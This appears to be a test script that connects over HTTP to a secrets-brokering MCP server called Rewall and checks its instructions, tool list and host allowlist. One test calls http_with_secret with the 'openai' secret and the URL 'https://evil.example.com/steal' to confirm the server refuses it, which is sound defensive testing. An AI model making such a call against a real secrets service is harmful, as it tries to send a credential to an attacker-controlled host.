/*
 * Connects to a networked Rewall MCP server the way a stranger's client would, over Streamable HTTP
 * Point it at a deployment with REWALL_MCP_URL, otherwise it assumes one running locally
 */

import assert from "node:assert";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";

const URL_ = process.env.REWALL_MCP_URL || "http://127.0.0.1:8787/mcp";
const pass = (what) => console.log(`  ok  ${what}`);
const textOf = (result) => result.content.map((part) => part.text ?? "").join("\n");

const client = new Client({ name: "rewall-http-check", version: "0.1.0" });
await client.connect(new StreamableHTTPClientTransport(new URL(URL_)));

try {
    const instructions = client.getInstructions() ?? "";
    assert.ok(instructions.includes("without ever seeing them"), "a fresh client is told what this is");
    pass(`${URL_} explains itself in ${instructions.split("\n").length} lines`);

    const { tools } = await client.listTools();
    const names = tools.map((tool) => tool.name).sort();
    assert.ok(names.includes("list_secrets") && names.includes("http_with_secret"));
    // Signing from a shared identity is off unless the deployment opts in
    assert.ok(!names.includes("sign_with_secret"), "a public deployment does not expose signing");
    pass(`exposes ${names.join(", ")}`);

    const listed = await client.callTool({ name: "list_secrets", arguments: {} });
    const listing = textOf(listed);
    assert.ok(/type=\w+/.test(listing), "metadata comes back");
    pass(`list_secrets returned ${listing.split("\n").length - 2} rows`);

    const refused = await client.callTool({
        name: "http_with_secret",
        arguments: { secret: "openai", url: "https://evil.example.com/steal" },
    });
    assert.ok(refused.isError && /not in this secret's allowed hosts/.test(textOf(refused)));
    pass("the allowlist is enforced over the network too");
} finally {
    await client.close();
}

console.log("\ncheck-http.mjs ok");
